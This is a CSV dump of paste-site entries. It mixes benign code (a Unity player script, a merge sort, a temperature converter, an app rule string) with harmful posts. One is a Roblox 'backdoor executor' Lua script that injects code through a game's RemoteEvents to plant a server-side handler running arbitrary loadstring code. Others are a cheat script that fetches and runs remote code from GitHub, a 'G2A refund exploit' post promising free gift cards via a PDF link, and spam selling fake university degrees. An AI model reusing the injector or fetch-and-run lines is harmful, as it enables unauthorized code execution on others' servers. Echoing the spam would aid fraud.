id,title,username,language,date,content
r1JrkJcV,G2A.com Refund Exploit Jan 2024,ounnuo,GetText,Friday 12th of January 2024 12:01:51 AM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_721122.pdf
 
Working as of
12 January 2024"
M7LV8U55,WhatsApp: +86 19911539281 How to buy fake Bond University degree?,jf123123,C,Thursday 11th of January 2024 11:49:56 PM CDT,"How to buy fake Bond University degree? Order fake Bond University diploma online, Fake Bond University certificate for sale, Where to obtain replacement Bond University diploma certificate? Make the Bond University Academic transcript, Buy fake Bond University degree in AUS. https://www.diploma888.com/sample/bond-university-degree/

Bond University is Australia’s first private not-for-profit university and is located in Robina, a suburb in the City of Gold Coast, Queensland. buy fake degree, buy fake diploma, fake certificate, How to buy fake USA diploma? Can I order fake Bond University degree for a job online? 

Email: diplomacentersale@gmail.com 
WhatsApp: +86 19911539281
WeChat: +86 14779983878 
https://www.diploma888.com

"
6g4WiXDx,Pet Simulator 99! 🎉 2024 AutoFarm Script (Super Farm),Project-WD,Lua,Thursday 11th of January 2024 11:32:30 PM CDT,"-- Pet Simulator 99! 🎉 AutoFarm Script! (Copy & Paste into Executor)
-- 🆕 Huge Update (12/01/2024) (Insane Script)
-- Auto Farm, Auto Ranks, No Egg Animation, etc...
-- Script📝: 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
nFnaL1QY,Player.cs,DugganSC,C#,Thursday 11th of January 2024 10:53:05 PM CDT,"
using UnityEngine;
using UnityEngine.SceneManagement;

public class Player : MonoBehaviour
{
    private CharacterController _controller;
    private PlayerControls _playerInputs;

    [SerializeField]
    private float _moveSpeed = 5f;
    [SerializeField]
    private float _gravity = 10f;
    [SerializeField]
    private float _jumpHeight = 50f;
    
    private bool _isJumping;

    private bool _doubleJumped = false;

    [SerializeField]
    private float _yVelocity;
    private bool _isGrounded;

    [SerializeField]
    private int _score = 0;

    [SerializeField]
    private int _lives = 3;

    [SerializeField]
    private float _respawnDepth = -20f;

    [SerializeField]
    private Transform _respawnPoint;
    
    [SerializeField]
    private float _airControlMult = 0.1f;

    public delegate void OnInteract();
    public static event OnInteract onInteract;

    // Start is called before the first frame update
    void Start()
    {        
        if (!TryGetComponent<CharacterController>(out _controller))
        {
            Debug.LogError(""No character controller defined"");
            Debug.Break();
        }

        _controller.enabled = false;
        transform.position = _respawnPoint.position;
        _controller.enabled = true;

        _playerInputs = new PlayerControls();
        _playerInputs.Platforming.Enable();
        _playerInputs.Platforming.Jump.performed += Jump_performed;
        _playerInputs.Platforming.Interact.performed += Interact_performed;

        if (_respawnPoint == null)
        {
            Debug.Log(""No respawn point set, assuming initial position"");
            _respawnPoint = transform;
        }
    }

    private void Interact_performed(UnityEngine.InputSystem.InputAction.CallbackContext obj)
    {
        onInteract.Invoke();
    }

    public int GetScore() { 
        return _score; 
    }

    private void OnEnable()
    {
        Collectible.onCollect += Collectible_onCollect;
    }

    private void OnDisable()
    {
        Collectible.onCollect -= Collectible_onCollect;
    }

    private void OnCollisionEnter(Collision collision)
    {
        Debug.Log(""Collision Enter"");
    }

    private void OnCollisionStay(Collision collision)
    {
        Debug.Log(""Collided"");
        if (!_isGrounded && collision.gameObject.CompareTag(""Wall""))
        {
            ContactPoint[] contactPoints = new ContactPoint[collision.contactCount];
            int collisionCount = collision.GetContacts(contactPoints);
            foreach (ContactPoint cp in contactPoints)
            {
                Debug.DrawRay(cp.point, cp.normal);
            }
        }
    }

    private void OnControllerColliderHit(ControllerColliderHit hit)
    {
        if (!_isGrounded)
        {
            Debug.DrawRay(hit.point, hit.normal * 5, Color.green);
        }
    }

    private void Collectible_onCollect(int value)
    {
        _score += value;
        UIManager.Instance.UpdateScore(_score);
    }

    private void Jump_performed(UnityEngine.InputSystem.InputAction.CallbackContext obj)
    {
        if (_isGrounded || !_doubleJumped)
        {
            _isJumping = true;
        }
    }

    private void FixedUpdate()
    {
        _isGrounded = _controller.isGrounded;
    }

    // Update is called once per frame
    void Update()
    {
        Vector2 playerMovement = _playerInputs.Platforming.Movement.ReadValue<Vector2>();
        Vector3 velocity = _controller.velocity;
        if (_isGrounded)
        {
            velocity = new Vector3(playerMovement.x, 0, 0) * _moveSpeed;
        }

        if (!_isGrounded)
        {
            if (_isJumping && !_doubleJumped)
            {
                _yVelocity += _jumpHeight;
                _doubleJumped = true;
                _isJumping = false;
            }
            _yVelocity -= _gravity;
        }
        else
        {
            if (_isJumping)
            {
                _yVelocity = _jumpHeight;
                _isJumping = false;
                _doubleJumped = false;
            }
            else
            {
                // _yVelocity = 0;
            }
        }

        velocity.y = _yVelocity;

        if (velocity.z > 0)
        {
            Debug.Log(velocity);
            Debug.Break();
        }

        _controller.Move(velocity * Time.deltaTime);

        if (transform.position.y < _respawnDepth)
        {
            Debug.Log(""Respawning"");
            // Character has fallen and died
            _lives--;
            UIManager.Instance.UpdateLives(_lives);

            if (_lives <= 0)
            {
                // Game Over
                SceneManager.LoadScene(""Level1"");
            }

            _controller.enabled = false;
            transform.position = _respawnPoint.position;
            _controller.enabled = true;
        }
    }
}
"
pqnvdecS,Merge Sort AA Project,Zuhairy_Harry,C++,Thursday 11th of January 2024 10:40:11 PM CDT,"void merge(vector<Student>& students, int low, int mid, int high, int& swapCount) {
    // ... (constant time operations)

    for (int i = 0; i < n1; i++)
        left[i] = students[low + i];  // O(n1) - copying elements to left array
    for (int j = 0; j < n2; j++)
        right[j] = students[mid + 1 + j];  // O(n2) - copying elements to right array

    int i = 0, j = 0, k = low;

    while (i < n1 && j < n2) {
        if (left[i].id <= right[j].id) {
            students[k++] = left[i++];  // O(1) - copying element from left to students
        } else {
            students[k++] = right[j++];
            swapCount += n1 - i;  // O(1) - counting swaps when elements are moved from left to right
        }
    }

    while (i < n1) {
        students[k++] = left[i++];  // O(1) - copying remaining elements from left to students
    }
    while (j < n2) {
        students[k++] = right[j++];  // O(1) - copying remaining elements from right to students
    }
}

void mergeSort(vector<Student>& students, int low, int high, int& swapCount) {
    if (low < high) {
        int mid = low + (high - low) / 2;

        mergeSort(students, low, mid, swapCount);   // T(n/2) - recursive call on left half
        mergeSort(students, mid + 1, high, swapCount);  // T(n/2) - recursive call on right half

        merge(students, low, mid, high, swapCount);  // O(n) - merging two sorted halves
    }
    // Base case: if low >= high, no work is done
}
"
GSBHEA1Q,sinner executor backdoor version with better ui + script hub,robloxscriptsbbbbb2,Lua,Thursday 11th of January 2024 10:34:16 PM CDT,"-- i did not steal from https://pastebin.com/MAANduKv its my account (i didnt log in)
-- run this with getgenv().usecoregui = true
-- if ur executor doesnt support getgenv then run it without getgenv (loads it without coregui)
-- Gui to Lua
aaa = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local TextBox = Instance.new(""TextBox"")
local TextLabel = Instance.new(""TextLabel"")
local TextButton = Instance.new(""TextButton"")
local unfe = Instance.new(""TextButton"")
local exec = Instance.new(""TextButton"")
local clear = Instance.new(""TextButton"")
local scripthub = Instance.new(""Frame"")
local grabknife = Instance.new(""TextButton"")
local TextLabel_2 = Instance.new(""TextLabel"")
local ligma = Instance.new(""TextButton"")
local freddyfazbear = Instance.new(""TextButton"")
local tophat = Instance.new(""TextButton"")
local minosprime = Instance.new(""TextButton"")
local spongebob = Instance.new(""TextButton"")
aaa.Name = ""aaa""
if not getgenv then
	getgenv = function()
		return {usecoregui = false}
	end
end
if getgenv().usecoregui == true then
	aaa.Parent = game.CoreGui
else
	aaa.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
end
aaa.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
aaa.ResetOnSpawn = false
Frame.Parent = aaa
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(0, 98, 255)
Frame.Draggable = true
Frame.Position = UDim2.new(0, 50, 0, 41)
Frame.Size = UDim2.new(0, 455, 0, 218)
TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(0, 30, 140)
TextBox.Position = UDim2.new(0, 0, 0.252293587, 0)
TextBox.Size = UDim2.new(0, 455, 0, 117)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.SourceSans
TextBox.MultiLine = true
TextBox.PlaceholderText = ""test""
TextBox.Text = ""print'test'""
TextBox.TextColor3 = Color3.fromRGB(245, 245, 245)
TextBox.TextSize = 17.000
TextBox.TextStrokeTransparency = 0.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(17, 0, 255)
TextLabel.Size = UDim2.new(0, 455, 0, 51)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = ""sinner""
TextLabel.TextColor3 = Color3.fromRGB(0, 208, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 23.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextButton.Parent = TextLabel
TextButton.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0, 336, 0, 0)
TextButton.Size = UDim2.new(0, 119, 0, 50)
TextButton.Font = Enum.Font.Arial
TextButton.Text = ""script-hub""
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 25.000
unfe.Name = ""unfe""
unfe.Parent = Frame
unfe.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
unfe.Position = UDim2.new(0, 161, 0, 172)
unfe.Size = UDim2.new(0, 175, 0, 46)
unfe.Font = Enum.Font.Arial
unfe.Text = ""Execute""
unfe.TextColor3 = Color3.fromRGB(0, 0, 0)
unfe.TextSize = 32.000
unfe.TextWrapped = true
exec.Name = ""exec""
exec.Parent = Frame
exec.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
exec.Position = UDim2.new(0, 0, 0, 172)
exec.Size = UDim2.new(0, 161, 0, 46)
exec.Font = Enum.Font.Arial
exec.Text = ""Inject""
exec.TextColor3 = Color3.fromRGB(0, 0, 0)
exec.TextSize = 32.000
exec.TextWrapped = true
clear.Name = ""clear""
clear.Parent = Frame
clear.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
clear.Position = UDim2.new(0, 337, 0, 172)
clear.Size = UDim2.new(0, 118, 0, 46)
clear.Font = Enum.Font.Arial
clear.Text = ""Clear""
clear.TextColor3 = Color3.fromRGB(0, 0, 0)
clear.TextSize = 32.000
clear.TextWrapped = true
scripthub.Name = ""scripthub""
scripthub.Parent = aaa
scripthub.Active = true
scripthub.BackgroundColor3 = Color3.fromRGB(0, 98, 255)
scripthub.Draggable = true
scripthub.Position = UDim2.new(0, 50, 0, 41)
scripthub.Size = UDim2.new(0, 455, 0, 218)
scripthub.Visible = false
grabknife.Name = ""grabknife""
grabknife.Parent = scripthub
grabknife.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
grabknife.Position = UDim2.new(0, 7, 0, 61)
grabknife.Size = UDim2.new(0, 182, 0, 45)
grabknife.Font = Enum.Font.Arial
grabknife.Text = ""die mart""
grabknife.TextColor3 = Color3.fromRGB(0, 0, 0)
grabknife.TextSize = 29.000
grabknife.TextWrapped = true
TextLabel_2.Parent = scripthub
TextLabel_2.BackgroundColor3 = Color3.fromRGB(17, 0, 255)
TextLabel_2.Size = UDim2.new(0, 455, 0, 51)
TextLabel_2.Font = Enum.Font.Cartoon
TextLabel_2.Text = ""sinner""
TextLabel_2.TextColor3 = Color3.fromRGB(0, 208, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 23.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
ligma.Name = ""ligma""
ligma.Parent = scripthub
ligma.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
ligma.Position = UDim2.new(0, 267, 0, 61)
ligma.Size = UDim2.new(0, 182, 0, 45)
ligma.Font = Enum.Font.Arial
ligma.Text = ""golden ss""
ligma.TextColor3 = Color3.fromRGB(0, 0, 0)
ligma.TextSize = 29.000
ligma.TextWrapped = true
freddyfazbear.Name = ""freddyfazbear""
freddyfazbear.Parent = scripthub
freddyfazbear.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
freddyfazbear.Position = UDim2.new(0, 7, 0, 113)
freddyfazbear.Size = UDim2.new(0, 182, 0, 45)
freddyfazbear.Font = Enum.Font.Arial
freddyfazbear.Text = ""c00lkidd""
freddyfazbear.TextColor3 = Color3.fromRGB(0, 0, 0)
freddyfazbear.TextSize = 29.000
freddyfazbear.TextWrapped = true
tophat.Name = ""tophat""
tophat.Parent = scripthub
tophat.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
tophat.Position = UDim2.new(0, 267, 0, 113)
tophat.Size = UDim2.new(0, 182, 0, 45)
tophat.Font = Enum.Font.Arial
tophat.Text = ""close""
tophat.TextColor3 = Color3.fromRGB(0, 0, 0)
tophat.TextSize = 30.000
tophat.TextWrapped = true
minosprime.Name = ""minosprime""
minosprime.Parent = scripthub
minosprime.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
minosprime.Position = UDim2.new(0, 7, 0, 167)
minosprime.Size = UDim2.new(0, 182, 0, 45)
minosprime.Font = Enum.Font.Arial
minosprime.Text = ""minos prime""
minosprime.TextColor3 = Color3.fromRGB(0, 0, 0)
minosprime.TextSize = 32.000
minosprime.TextWrapped = true
spongebob.Name = ""spongebob""
spongebob.Parent = scripthub
spongebob.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
spongebob.Position = UDim2.new(0, 267, 0, 167)
spongebob.Size = UDim2.new(0, 182, 0, 45)
spongebob.Font = Enum.Font.Arial
spongebob.Text = ""spongebob map""
spongebob.TextColor3 = Color3.fromRGB(0, 0, 0)
spongebob.TextSize = 28.000
spongebob.TextWrapped = true
--local backdoor;
function execute(s)
	if game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32"") then
		local Execute=game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32""):FireServer(tostring(s)) -- execute
	else
		warn(""Failed to loadstring: Error 404"")
	end
end
grabknife.MouseButton1Click:Connect(function()
	execute(""require(6571607508).load('""..game.Players.LocalPlayer.Name..""')"")
end)
ligma.MouseButton1Click:Connect(function()
	execute(""require(15039959789).stop('""..game.Players.LocalPlayer.Name..""')"")
end)
freddyfazbear.MouseButton1Click:Connect(function()
	execute(""require(12621812058).yeskido('""..game.Players.LocalPlayer.Name..""')"")
end)
minosprime.MouseButton1Click:Connect(function()
	execute(""require(13770496456)('""..game.Players.LocalPlayer.Name..""')"")
end)
spongebob.MouseButton1Click:Connect(function()
	execute(""require(3164497408).spongebob()"")
end)
TextButton.MouseButton1Click:Connect(function()
	if scripthub.Position ~= Frame.Position then
		scripthub.Visible = not scripthub.Visible
	end
end)
tophat.MouseButton1Down:Connect(function()
	scripthub.Visible = false
end)
exec.MouseButton1Click:Connect(function()
	local function b_G_V12(see)
		local a = function(ree)
			ree:FireServer([[
                    local folder = Instance.new('RemoteEvent')
                    folder.Name = ""_FEBYPASS32""
                    folder.Parent = game:GetService(""JointsService"")
                    local loadstring = require(13684410229)
                    folder.OnServerEvent:Connect(function(_1,_2)
                       loadstring(_2)()
                    end)
                    ]]
			)
		end
		for i, v in pairs(see:GetChildren()) do
			--[[3 lines]]
			if v:IsA(""RemoteEvent"") then
				if not string.match(string.lower(v.Name), ""ban"") then
					if not string.match(string.lower(v.Name), ""kick"") then
						a(v)
					end
				end
			end
			--[[-3 lines]]
			b_G_V12(v) --[[test]]
		end
	end
	local Inject = b_G_V12(game:GetService(""ReplicatedStorage""))
	local timetoken = 0
	local maxtime = 5
	repeat wait(0.1) timetoken += 0.1 until game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32"") or timetoken >= maxtime
	if game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32"") then
		exec.Text = ""Injected""
	end
end)
clear.MouseButton1Click:Connect(function()
	TextBox.Text = """"
end)
unfe.MouseButton1Click:Connect(function()
	if game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32"") then
		local Execute=game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32""):FireServer(TextBox.Text) -- execute
	else
		warn(""Failed to loadstring: Error 404"")
	end
end)"
xMJm452m,邀您一起看：奈落影视,xiaomianao666,JavaScript,Thursday 11th of January 2024 08:46:43 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥奈落影视@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJqczpcXG5ldmFsKGZldGNoKCdoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcm1vdmllLmpzJykpO2hpa2NoYXB0ZXIoKTtcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi6aaZ5oOF5b2x6KeGXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSQkaHR0cHM6Ly93d3cubmV3ZmlpLmNvbSQkZnlwYWdlJCTnlLXlvbEm55S16KeG5YmnJue7vOiJuibliqjmvKsm5Yqo5L2c54mHJuWWnOWJp+eJhybniLHmg4XniYcm56eR5bm754mHJuaBkOaAlueJhybliafmg4XniYcm5oiY5LqJ54mHJuWKqOeUu+eJhyblm73kuqfliacm5riv5Y+w5YmnJuasp+e+juWJpybml6Xpn6nliacm5rW35aSW5YmnJuWbvea8qybml6XmvKsm5qyn5ryrJuerpea8qyblm73kuqfnu7zoibom5pel6Z+p57u86Im6Juasp+e+jue7vOiJuibmuK/lj7Dnu7zoibokJDEmMiY0JjMmNyY4JjkmNiYxMCYxMSYxMiYyMCYxMyYxNCYxNiYxNSYyMSYyMiYyNSYyMyYyNCYyOCYzMCYyOSYzMSQkO2dldDtVVEYtODt7VXNlci1BZ2VudEBNb3ppbGxhLzUuMCAoTGludXjvvJvvvJsgQW5kcm9pZCAxMe+8m++8myBNaSAxMCBQcm8pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OC4wLjQzMjQuMTUyIE1vYmlsZSBTYWZhcmkvNTM3LjM2fVwiLFwiY29sX3R5cGVcIjpcIm1vdmllXzFcIixcImZpbmRfcnVsZVwiOlwianM6XFxuZXZhbChmZXRjaCgnaGlrZXI6Ly9maWxlcy9ydWxlcy94eXEvaGlrZXJtb3ZpZS5qcycpKTtoaWtobWVyaigpO1wiLFwiZ3JvdXBcIjpcIuKRoeW9seaQnFwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiLy/orr7nva7mm7TmlrDpl7TpmpTml7bpl7Qs5Y2V5L2N5Li65pW05pWw5aSp44CCXFxudmFyIHVwdGltZSA9IDI7XFxuXFxuZnVuY3Rpb24gdXBydWxlZmlsZSgpIHtcXG4gICAgdmFyIHJ1bGVqcyA9IGZldGNoKCdodHRwczovL2NvZGUuYWxpeXVuLmNvbS9semsyMzU1OS9DbG91ZFJ1bGUvcmF3L21hc3Rlci9oaWtlcm1vdmllLmpzJywge30pO1xcbiAgICBpZiAocnVsZWpzLnNlYXJjaCgvbGF6eVJ1bGUvKSA9PSAtMSkge1xcbiAgICAgICAgcnVsZWpzID0gZmV0Y2goJ2h0dHBzOi8vY29kZWJlcmcub3JnL2x6azIzNTU5L2Nsb3VkcnVsZS9yYXcvYnJhbmNoL21hc3Rlci9oaWtlcm1vdmllLmpzJywge30pO1xcbiAgICB9XFxuICAgIGlmIChydWxlanMuc2VhcmNoKC9sYXp5UnVsZS8pICE9IC0xKSB7XFxuICAgICAgICB3cml0ZUZpbGUoXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMveHlxL2hpa2VybW92aWUuanNcXFwiLCBydWxlanMpO1xcbiAgICB9XFxuICAgIHZhciBydWxlanNvbiA9IGZldGNoKCdodHRwczovL2NvZGUuYWxpeXVuLmNvbS9semsyMzU1OS9DbG91ZFJ1bGUvcmF3L21hc3Rlci9oaWtlcm1vdmllLmpzb24nLCB7fSk7XFxuICAgIGlmIChydWxlanNvbi5zZWFyY2goL1xcXFxcXFwidm9kaHJlZlxcXFxcXFwiLykgPT0gLTEpIHtcXG4gICAgICAgIHJ1bGVqc29uID0gZmV0Y2goJ2h0dHBzOi8vY29kZWJlcmcub3JnL2x6azIzNTU5L2Nsb3VkcnVsZS9yYXcvYnJhbmNoL21hc3Rlci9oaWtlcm1vdmllLmpzb24nLCB7fSk7XFxuICAgIH1cXG4gICAgaWYgKHJ1bGVqc29uLnNlYXJjaCgvXFxcXFxcXCJ2b2RocmVmXFxcXFxcXCIvKSAhPSAtMSkge1xcbiAgICAgICAgd3JpdGVGaWxlKFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcm1vdmllLmpzb25cXFwiLCBydWxlanNvbik7XFxuICAgIH1cXG4gICAgaWYgKHJ1bGVqcy5zZWFyY2goL2xhenlSdWxlLykgIT0gLTEgJiYgcnVsZWpzb24uc2VhcmNoKC9cXFxcXFxcInZvZGhyZWZcXFxcXFxcIi8pICE9IC0xKSB7XFxuICAgICAgICB3cml0ZUZpbGUoXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMveHlxL2hpa2VydXBkYXRlLnR4dFxcXCIsIG5ldyBEYXRlKCkgKyAnJyk7XFxuICAgICAgICBjb25maXJtKHt0aXRsZTon5o+Q56S6JywgY29udGVudDon6Ieq5Yqo5pu05paw5a6M5oiQJ30pO1xcbiAgICB9IGVsc2Uge1xcbiAgICAgICAgY29uZmlybSh7dGl0bGU6J+aPkOekuicsIGNvbnRlbnQ6J+iHquWKqOabtOaWsOWksei0pSd9KTtcXG4gICAgfVxcbn1cXG5cXG5cXG5cXG4vL+ajgOa1i+aYr+WQpuacieWGmeWFpeaXtumXtOS4juinhOWImeeahGpz5o+S5Lu25paH5Lu2XFxuaWYgKGZpbGVFeGlzdChcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy94eXEvaGlrZXJ1cGRhdGUudHh0XFxcIikgJiYgZmlsZUV4aXN0KFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcm1vdmllLmpzXFxcIikgJiYgZmlsZUV4aXN0KFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcm1vdmllLmpzb25cXFwiKSkge1xcbiAgICAvL+iuoeeul+aXtumXtOmXtOmalFxcbiAgICB2YXIgc3RhcnQgPSBuZXcgRGF0ZShmZXRjaChcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy94eXEvaGlrZXJ1cGRhdGUudHh0XFxcIiwge30pKTtcXG4gICAgdmFyIG5vd3QgPSBuZXcgRGF0ZSgpO1xcbiAgICB2YXIgRF9UID0gbm93dC5nZXRUaW1lKCkgLSBzdGFydC5nZXRUaW1lKCk7XFxuICAgIHZhciBEX0QgPSBEX1QgLyAoMTAwMCAqIDM2MDAgKiAyNCk7XFxuICAgIHZhciB0ZGlmID0gcGFyc2VJbnQoRF9EKSArICcnO1xcbiAgICAvL2xvZyh0ZGlmKTtcXG4gICAgLy/pu5jorqTpl7TpmpTotoXov4forr7nva7lpKnmlbDlsLHlj5bkuIDmrKHkupHnq6/mlofku7ZcXG4gICAgaWYgKHRkaWYgPj0gdXB0aW1lIHx8IHRkaWYgPCAwKSB7XFxuICAgICAgICB1cHJ1bGVmaWxlKCk7XFxuICAgIH1cXG59IGVsc2Uge1xcbiAgICAvL+WmguaenOWwkeS4gOS4quaWh+S7tuWwseiHquWKqOWPluS6keerr+aWh+S7tlxcbiAgICB1cHJ1bGVmaWxlKCk7XFxufVxcblxcblxcblxcbi8v5omn6KGM6ZyA6KaB6aKE5aSE55CG55qE56uZ54K5XFxudmFyIGxhYyA9IGZldGNoKCdoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcm1vdmllLmpzJyk7XFxuLy9sb2cobGFjLmxlbmd0aCk7XFxuaWYgKGxhYy5zZWFyY2goL2xhenlSdWxlLykgIT0gLTEpIHtcXG4gICAgZXZhbChsYWMpO1xcbiAgICBoaWtlcnByZSgpO1xcbn0gZWxzZSB7XFxuICAgIC8v5aaC5p6c5pys5Zyw5paH5Lu25LiN5a+55bCG5bCd6K+V6Ieq5L+u5aSNXFxuICAgIHVwcnVsZWZpbGUoKTtcXG4gICAgc2V0RXJyb3IoJ+inhOWImeS/ruWkjeWujOaIkO+8jOWmguaciemXrumimOivt+WPjemmiOOAgicpXFxufVwiLFwicGFnZXNcIjpcIltdXCJ9IiwicGljVXJsIjoiaHR0cHM6Ly9uZXdmaWkuY29tL3RlbXBsYXRlL214b25lL214c3RhdGljL3BpY3R1cmUvbG9nby5wbmdAUmVmZXJlcj0iLCJ0aXRsZSI6IuWliOiQveW9seinhiJ9
qZSkVJP9,CelsiustoFahrenheit,MladenKarachanov,Java,Thursday 11th of January 2024 08:07:44 PM CDT,"package programmingBasics;

import java.util.Scanner;

public class CelsiustoFahrenheit {
    public static void main(String[] args) {
        Scanner scanner= new Scanner(System.in);
        double degrees=Double.parseDouble(scanner.nextLine());
        double f =degrees*1.8+32;
        System.out.printf(""%.02f"",f);
    }
}
"
